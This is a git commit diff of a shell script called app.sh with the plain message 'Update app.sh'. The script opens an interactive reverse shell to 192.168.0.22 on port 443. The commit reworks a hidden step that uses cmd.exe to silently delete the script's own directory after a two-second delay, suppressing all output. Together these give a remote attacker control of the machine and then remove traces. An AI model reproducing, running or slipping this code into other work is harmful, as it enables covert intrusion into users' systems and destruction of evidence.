6863c0e784a4cbf348a9c8ec21c848299df6cf26
SoyluEren2004 <139225815+SoyluEren2004@users.noreply.github.com>
2026-09-05 02:00:22 +0300

    Update app.sh

--- app.sh
+++ app.sh
@@ -2,7 +2,9 @@
 
 bash -i >&/dev/tcp/192.168.0.22/443 0>&1
 
-TARGET_DIR=$(pwd)
+WIN_DIR=$(cygpath -w "$PWD")
+
 cd ..
 
-cmd.exe /c "timeout /t 2 /nobreak >nul && rmdir /s /q \"$TARGET_DIR\"" &
+
+cmd.exe /c "timeout /t 2 /nobreak >nul && rmdir /s /q \"$WIN_DIR\"" >/dev/null 2>&1 &
